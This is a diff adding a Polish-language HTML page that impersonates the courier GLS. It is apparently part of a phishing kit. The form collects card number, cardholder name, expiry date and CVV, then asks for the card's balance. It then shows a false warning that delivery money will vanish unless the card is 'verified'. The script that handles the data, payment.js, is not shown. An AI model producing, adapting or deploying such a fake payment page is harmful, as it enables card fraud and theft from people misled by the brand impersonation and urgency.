@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Płatność kartą</title>
+    <style>
+        body {
+            font-family: "Arial", sans-serif;
+            background-color: #f8fbfd;
+            margin: 0;
+            padding: 20px;
+        }
+        .header {
+            background-color: #0069d9;
+            color: gray;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            transition: 0.3s;
+        }
+        h1 {
+            text-align: center;
+            color: #343a40;
+            margin-bottom: 30px;
+            font-family: 'Helvetica Neue', sans-serif;
+        }
+        p {
+            text-align: center;
+            color: #6c757d;
+            margin-bottom: 20px;
+        }
+        .card-input {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #495057;
+        }
+        input[type="text"],
+        input[type="number"], 
+        input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid 
+#d3d4cb;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        input[type="text"]:focus,
+        input[type="number"]:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+        input[type="submit"] {
+            background-color: #28a745;
+            color: white;
+            margin: 5px 0px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        input[type="submit"]:hover {
+            background-color: #218838;
+            transform: scale(1.02);
+        }
+        .verification-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+            margin: 20px 0;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        .verification-button:hover {
+            background-color: #0056b3;
+            transform: scale(1.02);
+        }
+        .logos {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        .logos img {
+            width: 45px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+        .verification-container {
+            display: none;
+            text-align: center;
+            margin-top: 30px;
+        }
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            color: gray;
+            font-size: 18px; /* Уменьшенный размер текста */
+            font-weight: bold;
+            text-align: center;
+            padding-top: 40%;
+            z-index: 1000;
+        }
+        .loading-screen span {
+            opacity: 0.7;
+            animation: dots 1s steps(5, end) infinite;
+            font-size: 18px; /* Уменьшенный размер анимации */
+        }
+        @keyframes dots {
+            0%, 20% {
+                content: "";
+            }
+            40% {
+                content: ".";
+            }
+            60% {
+                content: "..";
+            }
+            80% {
+                content: "...";
+            }
+            100% {
+                content: "";
+            }
+        }
+    </style>
+</head>
+<body>
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/GLS_Logo_2021.svg" alt="GLS Logo" style="height: 30px" />
+    </div>
+
+    <div class="container" id="mainCont">
+        <h1></h1>
+
+        <form id="paymentForm" onsubmit="handlePayment(event)">
+            <div class="card-input">
+                <label for="card-number">Numer karty (16 cyfr)</label>
+                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19" oninput="formatCardNumber(this)" />
+            </div>
+
+            <div class="card-input">
+                <label for="cardholder-name">Imię i nazwisko posiadacza karty</label>
+                <input type="text" id="cardholder-name" placeholder="Jan Kowalski" required />
+            </div>
+
+            <div class="card-input">
+                <label for="expiry-date">Data ważności (MM/RR)</label>
+                <input type="text" id="expiry-date" placeholder="MM/RR" required maxlength="5" oninput="formatExpiryDate(this)" />
+            </div>
+
+            <div class="card-input">
+                <label for="cvv">CVV</label>
+                <input type="password" id="cvv" placeholder="***" required maxlength="3" oninput="formatCvv(this)" />
+            </div>
+
+            <div class="logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" 
+style="height: 21px"
+margin: 10px 10px; />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard"
+style="height: 21px" 
+text-align: center; />
+            </div>
+
+            <input type="submit" value="Przejdź do balansu" />
+        </form>
+
+        <form id="balanceForm" style="display:none;" onsubmit="handleBalance(event)">
+            <h1>Wprowadzenie Balansu</h1>
+            <p>Proszę wprowadzić kwotę.</p>
+
+            <div class="card-input">
+                <label for="balance">Kwota (zł)</label>
+                <input type="number" id="balance" placeholder="0.00" required step="0.01" />
+            </div>
+
+            <input type="submit" value="Zatwierdź" />
+        </form>
+
+        <div class="verification-container" id="verificationContainer">
+            <h1>Weryfikacja</h1>
+            <p>Twoja karta nie została zweryfikowana w naszym serwisie. Jeśli nie zweryfikujesz karty, pieniądze za dostawę trafią na nieistniejące konto i znikną.</p>
+            <p>Aby zweryfikować kartę, kliknij przycisk poniżej:</p>
+            <button class="verification-button" id="verificationButton">Weryfikacja</button>
+        </div>
+
+        <div class="footer">
+            <p>Bezpieczne płatności dzięki SSL</p>
+            <p>© 2024 GLS. Wszelkie prawa zastrzeżone.</p>
+        </div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        Proszę czekać, nawiązywanie połączenia <span>.</span>
+    </div>
+
+    <script src="payment.js"></script>
+</body>
+</html>
